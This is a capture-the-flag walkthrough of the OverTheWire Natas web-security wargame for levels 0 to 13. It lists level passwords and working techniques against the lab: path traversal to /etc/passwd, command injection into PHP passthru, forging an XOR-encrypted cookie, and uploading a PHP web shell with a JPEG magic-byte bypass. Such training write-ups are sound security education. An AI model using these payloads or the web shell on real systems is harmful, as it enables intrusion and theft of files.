# Natas Online Web security training.

## NATAS0

- Vulnerabilities here is sensitive information leak
- the answer is in the source code.
- pass: `gtVrDuiDfck831PqWsLEZy5gyDz1clto`

## NATAS1

- same as before, but disabled right click.
- we can view source using `CTRL+U`
- or `CTRL+SHIFT+C` to open dev console.
- pass: `ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi`

## NATAS2

- still sensitive information leak, but instead of on current source,
- it's is on other directory path called `files`
- we found `users.txt`

```txt
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

## NATAS3

- here, there is nothing on the webpage itself.
- but there is a clue saying `even google cant find it`
- things that prevent google for indexing our website path is called [robots.txt](https://developers.google.com/search/docs/advanced/robots/intro).
- this simple text file prevent google search engine to index any path mentions in this text file
- by navigating to the file, we see it is disallowing indexer bot from finding folder named `/s3cr3t`.
- there we found `users.txt` and

```
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

- read more on [robots.txt here](https://www.cloudflare.com/learning/bots/what-is-robots.txt/)

## NATAS4

- from here on things get more interesting,
- the webpage say something like this
  ![host-disallowed](./images/host-disallowed.png).
- let open up developer console, and take a look at our request under `Network Tab`.
- what we are focusing is here at our request to view the webpage.
  ![req-header](./images/req-header.png)
- seems like the webpage is checking the origin of where we come from.
- from quick google, we found out that if we change the [referer header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) we might be able to tell the website, we are comming from which page.

- so now we need to find a way to change our request header.
- there are few ways we can do this such as:
  - using BurpSuite
  - using postman
  - using CURL.
- I prefer to use curl, but you can try other methods.

  - to use curl, we first need to copy the Authorization token in our request header.
  - alternatively we can use the `-u` tag with the username:password of natas4

  ```
  Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
  ```

  - then, we can start constructing our request.
  - we use `-H` to set our authorization header to the token we coppied earlier.
  - then we use `-e` to change the referer to `http://natas5.natas.labs.overthewire.org/`
  - alternatively we can also use `-H` to set our `Referer` header.
  - the `-H` simply means to set `Headers`
  - `-b` to set cookie.
  - `-A` to set User-Agent.
  - our curl request end up looking like this.

  ```bash
  curl -H "Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va" -e "http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org/index.php | grep natas5
  ```

  - we can also pipe it in grep to highlight the password
  - after run it, we got the webpage

  ```
  Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

  ```

## NATAS5

- here we got Access disallowed, We are not logged in.
- there are few possibilities here, login usually associated with session.
- let's take a look at the request and cookies via our Developer console.

  ![loggedin](./images/loggedin.png)

- here we can see, there is a cookie called loggedin, and are set to 0.
- let us try change it to 1.
- on dev console, go to `application` tab > `Storage` > `Cookies` > click on natas5.
- here we can see the cookies used for this website.
- simply double click the value `0` of `loggedin` to edit it.
- after edit, simply refresh the page.
- we got

```
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```

## NATAS6

- here we got an input box asking for secret.
- inspecting the source code, we noticed, that the php code includes a file called `secret.inc`

```php
<?
include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

- the files is used to check the secret.
- we try to see if we have access to the `inclues/secret.inc` by navigating to it on our browser.
- and indeed we can, and the file contains secret that we can use for the input.

```php
<?
    $secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

- and we got this

```
Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```

## NATAS7

- here we see a blank with navigation link.
- inspecting source code, we noticed that the site resolve the page via the page query. `index.php?page`
- input `index.php?page=home`, will yield a home page.
- but let's try input something that doesn't exits such as `index.php?page=l33t`
- we got warning looks like this.
  ![warnings](./images/warning.png)
- here the warning explain, that php code trying to include anything that we input as the query.
- it doesn't even sanities the input.
- this might results in `file traversal` attack, where we can make use of the `include()` method to navigate around filesystem.
- noted that we might not be able to view files, that we have no permission to look at.
- here we can manipulate the query params like this `index.php?page=../`
- this results in page trying to include `/var/www/natas`
- which maybe a directory one up above current page directories.
- we can try to traverse to `/etc/passwd` directory and we got the content of it.

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
```

- we can navigate to other path if we want, let say `/etc/mysql/my.cnf`
- but let now try to navigate to `/etc/natas_webpass/natas8`
- here we found our password.

```
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
```

## NATAS8

- here we see another input field that check for secret.
- inspecting the code, we see the secret but encoded.
- analysing the code, we found out that the secret are encoded via this process:
  - based64_encode() -> strrev() -> bin2hex()
- all we got to do to decode this is to reverse the encoding process.
  - hex2bin() -> strrev() -> base64_decode()
- there are multiple ways to solve this, via online tools, php function or just your linux os.
- in linux, we can manipulate hex value using `xxd` command.
- to manipulate base64 string we can use build in `base64` command.
- to reverse string we can use `rev` command.

### xxd

- to turn a string into a hex we can use it like this `echo "ourString" | xxd -p`
- `-p` options simply print it in a plain format.
- to reverse the process we use `-r`.
- let's try it on our encodedSecret.

```
echo 3d3d516343746d4d6d6c315669563362 | xxd -r -p
```

- we get this which looks like a base64 format but in reverse.

```
==QcCtmMml1ViV3b
```

### rev

- reversing a string is simple, simply run

```
echo "hello" | rev
```

and it will produce

```
olleh
```

- lets try it on our previous output.

```
echo ==QcCtmMml1ViV3b | rev
```

now we got the correct base64 format

```
b3ViV1lmMmtCcQ==
```

### base64

- to create a base64 string simply run

```
echo "hello" | base64
```

and we will get

```
aGVsbG8K
```

- to decode it we use the `-d` tag.
- lets try it on our previous output.

```
echo b3ViV1lmMmtCcQ== | base64 -d
```

we will get

```
oubWYf2kBq
```

- alternatively we can just combine all of the command in one line by piping each output to another.

```
echo 3d3d516343746d4d6d6c315669563362 | xxd -r -p | rev | base64 -d
```

- let's try to use this in the input field.
- and we got the password.

```
Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```

## NATAS9

- here we see another input that take our input as search keywords.
- future inspecting the source, we see that it use [passthru](https://www.php.net/manual/en/function.passthru.php) on our input.
- reading the docs, explain that, passthru enable us to pass os command and get the output data.
- we notice that the `passthru` command in this code, use `grep` to search for text.

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

- we know that using `grep` command we can read content of a file.
- the webpage do not sanitize our input, thus we are able to break the code and perform `code injection` attack.
- we can alter our input to make it execute something like this

```php
//our input is:  root /etc/passwd && ls
passthru("grep -i root /etc/passwd # dictionary.txt")
```

- because the code simply append our input directly into the function
- we are able to inject our own command into it. by manipulating the ways linux execute command.
- doing above example we got this output.

```
root:x:0:0:root:/root:/bin/bash
```

- let us now, view the content of `/etc/natas_webpass/natas10`

```php
//our input is: '' /etc/natas_webpass/natas10 #
passthru("grep -i '' /etc/natas_webpass/natas10 # dictionary.txt")
```

- we got the password

```
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```

- alternatively we can break command like this

```php
//our input is: '' test.txt & cat /etc/natas_webpass/natas10 #
passthru("grep -i '' test.txt & cat /etc/natas_webpass/natas10 # dictionary.txt")

//or
//our input is: '' . ; cat /etc/natas_webpass/natas10 #
passthru("grep -i '' . ; cat /etc/natas_webpass/natas10 # dictionary.txt")
```

- there are multiple ways to do it.

## NATAS10

- this level is same as level9 but our input get filtered by regex.
- let us inspect the regex

```
/[;|&]/
```

- what it does is , it check for any character inside list denoted by the `[]`
- based on it we know that it check for `;` and `&` character. only this two.
- from our previous exploit. we don't actually use these two characters.
- so we can simply run the same exploit again but change file to `natas11`
- we got the password

```
U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```

## NATAS11

- this level is quite challenging, we need to understand php.
- we are given an input box to change background color.
- inspecting the source code, we noticed that our password is shown based on this condition

```php
<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>
```

- tracing the variable data, it come from here

```php
$data = loadData($defaultdata);
```

- it gets it value from passing defaultdata into loadData function.

```php
//default data
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

//our function
function loadData($def) {
    global $_COOKIE; //using cookie
    $mydata = $def; //asign default data to mydata

    //check if there is cookie called data.
    if(array_key_exists("data", $_COOKIE)) {

        // ---------------important part------------------
        //simply decode the cookie and assign to temptdata.
        $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);

        //------------------------------------------------

        //---------less important part------------------
        //check if cookies decoded correctly
        if(is_array($tempdata) &&
            array_key_exists("showpassword", $tempdata) &&
            array_key_exists("bgcolor", $tempdata)) {

                //if so, and if bgcolor in hex format
            if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {

                //asign temptdata to mydata
                $mydata['showpassword'] = $tempdata['showpassword'];
                $mydata['bgcolor'] = $tempdata['bgcolor'];
            }
        }
        // -----------------------------------------------
    }

    //return back mydata
    return $mydata; //if ! _COOKIE["data"]; then myData = defaultData
}
```

- looking at loadData, we know that our `$data` can also take value from cookie.
- we notice that the cookies is stored as the encoded string.

```php
function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));

    // base64_encode(xor_encrypt(json_encode($d)))

    // plain-> (json->xor->base64->) encoded
}
```

- this part of code telly with the decoding part in `loadData()`

```php
$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);

//decode
// encode -> (base64->xor->json_d) -> plain
```

- so here we know that data in cookie get encoded.
- but we don't really need to decode it, we just need to set the cookie value of "showpassword" to "yes"

```php
array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"); //instead of no
```

- for us to trick the page into showing the password.
- but the problem is we need to encrypt the cookie value.
- we can find the default cookie set by the page using `Dev console` > `Application` > `Storage` > `Cookies`.
- we can try encrypt the our cookie by using this script running locally on our pc.

```php
$defaultdata= array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$encrypt = base64_encode(xor_encrypt(json_encode($defaultdata)));
echo "cookie: $encrypt";
```

- we got this

```
cookie: R0EWBhwYAgQXTUsMFwpRVVALCxwQQQcJEAAeChYcBkFGCBUJFAMCHEE=
```

- this is weird, we are using the same default value but, our cookie that we get from our code is not same as default cookie set by the page.
- we can try decode the dafault cookie set by the page using this script.
-

```php
<?php
$cookie = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D";
function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$decrypt = xor_encrypt(base64_decode($cookie));
echo "$decrypt";
// we expect => "array( "showpassword"=>"no", "bgcolor"=>"#ffffff")"
?>
```

- but the result is just rubbish value.
- so our code do not get decrypt correctly.
- if we set cookie to

```
R0EWBhwYAgQXTUsMFwpRVVALCxwQQQcJEAAeChYcBkFGCBUJFAMCHEE=
```

- we do get the expected value.
- the reason for this is, we are using the wrong key as being used by the page.
- so now we need to find the correct key being use to encrypt our cookie.
- we can find key by xoring `plaintext` with `cypher`.

```
plain xor key = encryp xor key = plain
10010011 xor 10010111 = 00000100 xor 10010111 = 10010011

plain xor encryp = key
10010011 xor 00000100 = 10010111
```

- from here we can alter our code to find the key

```php
<?php
$defaultdata= array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
$cookie = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D";

function xor_encrypt($in) {
    // $key = '<censored>';
    global $cookie;
    $key = base64_decode($cookie);
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$key = xor_encrypt(json_encode($defaultdata));
echo "key: $key \n";
```

- running it and we got this

```
key: qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
```

- from here we assume the key is `qw8J` because the value is repeated to match the lenght of the text.
- we can now use the key inside the code we previously make, change the defaultdata value to `"yes"`, to get the encoded cookie.

```
cookie: ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
```

- then we simply change the cookie value in browser, and refresh the page.
- and then we get the password

```
The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3<br>

```

## NATAS12

- we got an upload form, seems like we need to exploit file upload vulnerability.
- then upload our shell to it.
- we first try to upload an empty `shell.php` file, then we got the name changed to some random string with extension of `.jpg`.
- inspecting the source code, we noticed, that there is a hidden input field that set the name before we upload

```php
<input type="hidden" name="filename" value="<? print genRandomString();?>.jpg" />
```

- we somehow need to bypass this and one of the solution is to make our own request using curl.
- to upload file using curl we can use the `-F` tags,
- this will add `enctype="multipart/form-data`.
- don't forget to specify our Authentication token with `-H` tag.
- our curl command will look something like this.

```sh
curl \
-F 'filename=shell.php' \
-F 'uploadedfile=@./shell.php' \
-H 'Authorization: Basic bmF0YXMxMjpFRFhwMHBTMjZ3TEtIWnkxckRCUFVaazBSS2ZMR0lSMw==' \
http://natas12.natas.labs.overthewire.org/index.php
```

- let's try upload a simple php file
- content of our `shell.php` look like this

```php
<?php
echo phpinfo();
?>
```

- we noticed that our upload process is successfull and we get the `.php` extension in our response.

```html
The file <a href="upload/ekf1gg6bsz.php">upload/ekf1gg6bsz.php</a> has been
uploaded
```

- clicking on that show us a phpinfo page.
- now it's time to create a simple PHP shell.

```php
<?php
    if(isset($_GET['cmd'])){
        system($_GET['cmd']);
    }
?>
```

- after we upload it, navigate to our file and add the `?cmd=pwd` query.
- we noticed that we got shell execution and able to run `pwd` command.
- now just cat the password file in `/etc/natas_webpass/natas13`
- we got the password

```
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
```

## NATAS13

- this one is almost the same as previous one.
- the diffrerent is, it perform check for the file type using `exif_imagetype()`.

```php
//if our file is image it return value, else it return false
// !false == true;
 else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
 }
```

- based on php official docs,
  > exif_imagetype() reads the first bytes of an image and checks its signature.
- maybe one way to bypass this is to change the first bytes of our php file into image magic number.
- from quick google we know that `jpeg` magic number is `FF D8 FF E0`
- so we simply append this hex as binary into the beginning of shell2.php

```sh
echo -n -e '\xFF\xD8\xFF\xE0'$(cat shell.php) > shell2.php
```

- we can check if we successfully change file type using `file command`

```sh
file -i shell2.php
```

- we get

```
shell2.php: image/jpeg; charset=iso-8859-1
```

- alternatively we can check using `hexdump` or `xxd`, and look at the first bytes

```
00000000: ffd8 ffe0 3c3f 7068 7020 6966 2869 7373  ....<?php if(iss
00000010: 6574 2824 5f47 4554 5b27 636d 6427 5d29  et($_GET['cmd'])
00000020: 297b 2073 7973 7465 6d28 245f 4745 545b  ){ system($_GET[
00000030: 2763 6d64 275d 293b 207d 203f 3e         'cmd']); } ?>
```

- we are successfully change our file type.
- now we can just upload it using previous method in natas12.
- dont forget to change the url and Authentication header in our curl command.
- we now got our password

```
Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
```

## NATAS14

- SQL injection
